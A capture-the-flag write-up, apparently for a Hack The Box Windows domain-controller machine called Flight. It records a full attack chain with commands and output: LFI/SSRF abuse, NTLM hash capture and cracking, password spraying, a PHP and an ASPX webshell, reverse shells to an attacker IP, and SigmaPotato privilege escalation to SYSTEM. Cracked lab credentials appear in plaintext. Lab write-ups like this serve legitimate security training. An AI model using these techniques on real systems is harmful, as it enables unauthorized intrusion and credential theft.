Difficulty: Hard
### Information Gathering

IP Address: 10.129.228.120

# User Flag
#### Service Enumeration

NMAP Enumeration through the ports.
```
sudo nmap 10.129.228.120
```

```
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

An entry to `/etc/hosts` is added.
```
10.129.228.120    flight.htb
```

The website looks interesting, but does not have any interesting interaction.
Subdomain Enumeration is performed.
```
ffuf -u http://flight.htb -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -fs 7069
```

`school` has been returned as a subdomain.
`school.flight.htb` is appended to the `/etc/hosts` file.

![[Screenshot 2026-07-25 at 20.08.15.png]]

This looks like a normal page.
However, `view=home.html` of the page makes it suspicious for a directory traversal attack.

`http://school.flight.htb/index.php?view=../../../../../../../../../windows/win.ini`

It did not worked, mentioning "Suspicious Activity Blocked!"

However, after trying the full path, this worked: `http://school.flight.htb/index.php?view=c:/windows/win.ini`

It returned the contents of the page successfully.
This is a Directory Traversal vulnerability.

Also, after trying this,`http://school.flight.htb/index.php?view=http://10.10.14.104:4444`

```
sudo nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.104] from (UNKNOWN) [10.129.228.120] 52008
GET / HTTP/1.1
Host: 10.10.14.104:4444
Connection: close
```

A SSRF Vulnerability worked out successfully.
However, shell catching did not worked.

Hash capturing through responder has been attempted.

URL: `http://school.flight.htb/index.php?view=http://10.10.14.104:4444`

```
sudo responder -I tun0 -v
```

A hash from the user `svc_apache` was returned.
The hash can be cracked through hashcat.

```
hashcat -m 5600 hash.txt rockyou.txt
```

The credentials are `svc_apache:S@Ss!K@*t13`

Although, `svc_apache` does not seem to have any interesting privileges.

```
netexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --rid-brute
```

The user enumeration was successful, a list of users has been generated. This will have the name `users.txt`

```
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
WebDevs
```

Login attempt using the same password is attempted.
```
netexec smb flight.htb -u  users.txt -p 'S@Ss!K@*t13'
```

`S.Moon:S@Ss!K@*t13` are another valid credentials.

The shares are now enumerated.
```
netexec smb flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13' --shares
```

It is possible to see that the `DEV` share is readable and writable and empty, it makes it suspicious for an NTLM Theft atttack.

A list of payloads is generated.
```
python3 ntlm_theft.py -g all -s 10.10.14.104 -f test
```

```
sudo responder -I tun0 -v
```

In order to upload the payload files.
```
smbclient //flight.htb/DEV -U 'S.Moon%S@Ss!K@*t13'
put windows.ini
```

A hash has been successfully captured after putting the payload on the SMB share.

The hash will be cracked using `hashcat`.
```
hashcat -m 5600 hash.txt rockyou.txt
```

The credentials are `C.Bum:Tikkycoll_431012284`

```
netexec smb flight.htb -u 'C.Bum' -p 'Tikkycoll_431012284' --shares
```

Now, this user has read and write access on the `Web` share.
```
cat shell.php
<?php system($_GET['cmd']); ?>
```

Connection to the `Web` share.
```
smbclient //flight.htb/Web -U 'C.Bum%Tikkycoll_431012284'
```

The share is directly related to the Apache server web directory.

It is actually possible to upload a webshell directly to the directory and access it through the browser.

This into `shell.php`
```
<?php system($_GET['cmd']); ?>
```

Then upload it through `smbclient`.
```
put shell.php
```

The reverse shell payload is grabbed from `revshells.com`

After visiting this URL, it is possible to 
get a shell: `http://school.flight.htb/index.php?view=shell.php?cmd=powershell -e <BASE64>`

On our Attacker machine:
```
sudo nc -lvnp 4445
[sudo] password for prizma:
listening on [any] 4445 ...
connect to [10.10.14.104] from (UNKNOWN) [10.129.228.120] 59764
whoami
flight\svc_apache
PS C:\xampp\htdocs\school.flight.htb>
```

However, the user is `svc_apache`, which have lower privileges than `C.Bum`.

`RunasCs.exe` must be transferred on the victim system,i in order to switch users between the same shell session.

The transfer of files can be done the same way as done for the `shell.php` file upload.

A new shell will be thrown with this command.
```
.\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.104:4446 cmd
```

Successful shell receival.
```
└─$ sudo nc -lvnp 4446
[sudo] password for prizma:
listening on [any] 4446 ...
connect to [10.10.14.104] from (UNKNOWN) [10.129.228.120] 61896
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
flight\c.bum
```

The user flag has been successfully obtained.

![[Screenshot 2026-07-26 at 10.41.42.png]]

# Root Flag
#### Privilege Escalation

The listening server ports are enumerated.
```
netstat -ano | findstr LISTENING
```

While there was no interesting exclusive localhost running applications, there is actually a port 8000 listening on the target, while actually it was not visible from NMAP. 

A port forwarding is initiated through ligolo.
```
sudo ip tuntap add user prizma mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo
```

On the attacker's machine.
```
ligolo-proxy -selfcert -laddr 0.0.0.0:1234
```

On the victim machine.
```
PS C:\xampp\htdocs\school.flight.htb> ./win-agent.exe -connect 10.10.14.104:1234 -ignore-cert
```

Through the URL `http://240.0.0.1:8000`, it is possible to access the web application.

![[Screenshot 2026-07-26 at 11.36.34.png]]

There was not much interesting interaction, but it is possible to see that the web server directory corresponds to the ASP `C:\inetpub\development` on the server.

A new ASP shell is transferred directly again in that corresponding directory to be accessed with the same way as the PHP one.

https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx

After uploading and accessing the link on `http://240.0.0.1:8000/shell.aspx`

![[Screenshot 2026-07-26 at 11.50.53.png]]

A reverse shell command similar to the previous one can be obtained through `revshells.com`.
```
└─$ sudo nc -lvnp 4447
[sudo] password for prizma:
listening on [any] 4447 ...
connect to [10.10.14.104] from (UNKNOWN) [10.129.228.120] 58879
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv>
```

A new shell is received.
This is a service account.

The privileges are checked.
```
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` is enabled on the target.

After the file `SigmaPotato.exe` is transferred to the system, it will throw another shell on the attacker machine.
```
.\SigmaPotato.exe --revshell 10.10.14.104 4444
```

```
─$ sudo nc -lvnp 4444
[sudo] password for prizma:
listening on [any] 4444 ...
connect to [10.10.14.104] from (UNKNOWN) [10.129.228.120] 58893

wPS C:\Users\Public>whoami
nt authority\system
PS C:\Users\Public>
```

The administrator account was exploited.
The root flag has been obtained.

![[Screenshot 2026-07-26 at 11.56.06.png]]